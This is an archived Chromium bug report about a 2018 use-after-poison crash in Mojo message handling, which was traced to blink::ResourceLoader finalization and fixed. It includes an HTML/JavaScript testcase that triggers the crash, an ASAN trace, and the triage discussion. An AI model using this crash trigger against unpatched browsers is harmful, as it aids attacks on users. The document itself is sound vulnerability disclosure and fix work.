# use-after-poison in mojo::InterfaceEndpointClient::HandleValidatedMessage)

| Field | Value |
|-------|-------|
| **Issue ID** | [40092022](https://issues.chromium.org/issues/40092022) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>Loader, Blink>Storage |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | ro...@chromium.org |
| **Created** | 2018-07-25 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest Chromium ASAN build when loaded from a HTTP server.

**VERSION**  

Chrome Version: asan-linux-release-577824  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<script>
function start() {
o178=window.top;
o833=new XMLHttpRequest();
o833.open('PUT','/',true);
o833.responseType='blob';
o833.send(undefined);
o3956=document.createElementNS('http://www.w3.org/1999/xhtml','canvas');
o4420=o3956.getContext('2d',{willReadFrequently: true,storage: false,});
o3956.offsetHeight;
window.setTimeout(fun0, 4);
}
function fun0() {
o4420.getImageData(4,1,-20480,-14336);
o178.close();
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

# Crash State:

==11918==ERROR: AddressSanitizer: use-after-poison on address 0x7eda44ef1538 at pc 0x55d01cdfce52 bp 0x7ffddb3d5450 sp 0x7ffddb3d5448  

READ of size 8 at 0x7eda44ef1538 thread T0 (chrome)  

#0 0x55d01cdfce51 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message\*) mojo/public/cpp/bindings/lib/interface\_endpoint\_client.cc:423:32  

#1 0x55d01ce11048 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper\*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:869:42  

#2 0x55d01ce0f0f1 in mojo::internal::MultiplexRouter::Accept(mojo::Message\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:590:38  

#3 0x55d01cdf5608 in mojo::Connector::ReadSingleMessage(unsigned int\*) mojo/public/cpp/bindings/lib/connector.cc:457:51  

#4 0x55d01cdf73af in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:486:10  

#5 0x55d01cddca84 in Run base/callback.h:129:12  

#6 0x55d01cddca84 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple\_watcher.cc:273  

#7 0x55d01b46e57c in Run base/callback.h:99:12  

#8 0x55d01b46e57c in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:101  

#9 0x55d01b576025 in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:166:21  

#10 0x55d01b46e57c in Run base/callback.h:99:12  

#11 0x55d01b46e57c in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:101  

#12 0x55d01b4688d4 in base::MessageLoop::RunTask(base::PendingTask\*) base/message\_loop/message\_loop.cc:421:46  

#13 0x55d01b469d2f in DeferOrRunPendingTask base/message\_loop/message\_loop.cc:432:5  

#14 0x55d01b469d2f in base::MessageLoop::DoWork() base/message\_loop/message\_loop.cc:480  

#15 0x55d01b4758df in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:37:31  

#16 0x55d01b4f822b in base::RunLoop::Run() base/run\_loop.cc:102:14  

#17 0x55d02cdc1e3a in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:200:23  

#18 0x55d01a77766d in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:554:14  

#19 0x55d01a77b93a in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:951:10  

#20 0x55d01a799cae in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:472:29  

#21 0x55d01a7757de in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#22 0x55d0127ef493 in ChromeMain chrome/app/chrome\_main.cc:101:12  

#23 0x7f568cbc32e0 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x202e0)

Address 0x7eda44ef1538 is a wild pointer.  

SUMMARY: AddressSanitizer: use-after-poison mojo/public/cpp/bindings/lib/interface\_endpoint\_client.cc:423:32 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message\*)  

Shadow bytes around the buggy address:  

0x0fdbc89d6250: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fdbc89d6260: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fdbc89d6270: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fdbc89d6280: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fdbc89d6290: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

=>0x0fdbc89d62a0: f7 f7 f7 f7 f7 f7 f7[f7]f7 f7 f7 f7 f7 f7 f7 f7  

0x0fdbc89d62b0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 00 00 00 00 00  

0x0fdbc89d62c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fdbc89d62d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fdbc89d62e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fdbc89d62f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==11918==ABORTING

## Timeline

### cl...@chromium.org (2018-07-25)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6502394742177792.

### cl...@chromium.org (2018-07-25)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6217234012438528.

### mb...@chromium.org (2018-07-26)

I'm having a bit of trouble reproducing this one, even using an HTTP server.

rockot: Any chance that this could be related to https://chromium-review.googlesource.com/c/chromium/src/+/1141078? Since I can't repro it's a bit of a shot in the dark, so feel free to pass it back to me for retriage if not.

[Monorail components: Internals>Mojo]

### sh...@chromium.org (2018-07-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-27)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-07-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-28)

[Empty comment from Monorail migration]

### mb...@chromium.org (2018-07-30)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-07-30)

Testcase 6217234012438528 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6217234012438528.

### cl...@chromium.org (2018-07-30)

Testcase 6502394742177792 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6502394742177792.

### aa...@google.com (2018-07-30)

[Empty comment from Monorail migration]

### ro...@chromium.org (2018-07-30)

It is conceivable that the CL you suggest is at fault, though it would be quite surprising to me. I have also been unable to repro, but I will keep digging.

### ro...@chromium.org (2018-07-30)

Can you help me understand the nature of use-after-poison errors? Is this a matter of memory being accessed after it's been deinitialized but not yet freed? i.e. use during partial destruction? If so, any insight onto how asan hooks in and poisons things when appropriate?

### sh...@chromium.org (2018-07-31)

[Empty comment from Monorail migration]

### mm...@chromium.org (2018-08-07)

rockot@, your understanding of use-after-poison is correct.

Here is some additional information:
- https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm
- https://github.com/google/sanitizers/issues/73

### go...@chromium.org (2018-08-07)

M69 Stable promotion is coming VERY soon. Your bug is labelled as Stable ReleaseBlock, pls make sure to land the fix and request a merge into the release branch ASAP. Thank you.

### ro...@chromium.org (2018-08-08)

Still cannot repro. I have no idea.

### ro...@chromium.org (2018-08-08)

Oooh. Managed to get a pretty consistent repro by having a tab open the testcase in a new window. Digging more...

### ro...@chromium.org (2018-08-08)

OK, so I have narrowed it down specifically to the blink.mojom.ProgressClient interface, and it's always a binding endpoint in a render process that is at fault. This narrows the issue down to exactly one place, blink::ResourceLoader[1].

I haven't done any further analysis yet. My guess would be that it must be possible for a ResourceLoader to be destroyed from a thread other than the main thread, but that's only a guess. This would be able to explain raciness between destruction and OnProgress message dispatch, and I'm really not sure what else could.

[1] https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/loader/fetch/resource_loader.h?rcl=eabf9ad0429004d92823c7594d0b141f97cdead8&l=193

### ro...@chromium.org (2018-08-08)

[Empty comment from Monorail migration]

[Monorail components: -Internals>Mojo Blink>Storage]

### me...@chromium.org (2018-08-08)

Not sure about the threading behavior of ResourceLoader. But maybe there are potential issues because ResourceLoader is garbage collected, and thus can be in a finalized-but-not-yet-destroyed state? In which case perhaps closing the binding in its Dispose method might be enough.

[Monorail components: Blink>Loader]

### ro...@chromium.org (2018-08-08)

Aha. Yes, that would perfectly explain what's happening here, and closing the binding sounds like the right thing to do. Thanks for the insight, I'll give that a stab.

### bu...@chromium.org (2018-08-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/0cc45e354863b2aa4d676335bd9aab4ecd50fe2c

commit 0cc45e354863b2aa4d676335bd9aab4ecd50fe2c
Author: Ken Rockot <rockot@chromium.org>
Date: Thu Aug 09 04:06:51 2018

Fix blink::ResourceLoader finalization

This causes blink::ResourceLoader::Dispose() to close the object's
blink.mojom.ProgressClient binding, preventing incoming IPCs from
being dispatched to the finalized object in the interim between
finalization and actual destruction.

Bug: 867370
Change-Id: I9a14c51cb5d75e11b211006d094d73beafab8922
Reviewed-on: https://chromium-review.googlesource.com/1168289
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Commit-Queue: Ken Rockot <rockot@chromium.org>
Cr-Commit-Position: refs/heads/master@{#581779}
[modify] https://crrev.com/0cc45e354863b2aa4d676335bd9aab4ecd50fe2c/third_party/blink/renderer/platform/loader/fetch/resource_loader.cc


### ro...@chromium.org (2018-08-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-08-09)

This bug requires manual review: M69 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: amineer@(Android), kariahda@(iOS), cindyb@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-08-09)

[Empty comment from Monorail migration]

### go...@chromium.org (2018-08-09)

+awhalley@ (Security TPM) for M69 merge review.

### aw...@chromium.org (2018-08-13)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-08-14)

govind@ - good for 69

### go...@chromium.org (2018-08-14)

Approving merge to M69 branch 3497 based on https://crbug.com/chromium/867370#c29. Please merge.

### bu...@chromium.org (2018-08-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e030fadca784f022be51ca276b4f8e3256bcc3da

commit e030fadca784f022be51ca276b4f8e3256bcc3da
Author: Ken Rockot <rockot@chromium.org>
Date: Tue Aug 14 20:36:57 2018

Fix blink::ResourceLoader finalization

This causes blink::ResourceLoader::Dispose() to close the object's
blink.mojom.ProgressClient binding, preventing incoming IPCs from
being dispatched to the finalized object in the interim between
finalization and actual destruction.

TBR=rockot@chromium.org

(cherry picked from commit 0cc45e354863b2aa4d676335bd9aab4ecd50fe2c)

Bug: 867370
Change-Id: I9a14c51cb5d75e11b211006d094d73beafab8922
Reviewed-on: https://chromium-review.googlesource.com/1168289
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Commit-Queue: Ken Rockot <rockot@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#581779}
Reviewed-on: https://chromium-review.googlesource.com/1175083
Reviewed-by: Ken Rockot <rockot@chromium.org>
Cr-Commit-Position: refs/branch-heads/3497@{#629}
Cr-Branched-From: 271eaf50594eb818c9295dc78d364aea18c82ea8-refs/heads/master@{#576753}
[modify] https://crrev.com/e030fadca784f022be51ca276b4f8e3256bcc3da/third_party/blink/renderer/platform/loader/fetch/resource_loader.cc


### aw...@google.com (2018-08-15)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-08-16)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-08-16)

$3,000 for this report, many thanks!

### aw...@chromium.org (2018-08-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-06)

This issue was migrated from crbug.com/chromium/867370?no_tracker_redirect=1

[Multiple monorail components: Blink>Loader, Blink>Storage]
[Monorail mergedwith: crbug.com/chromium/868724]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092022)*
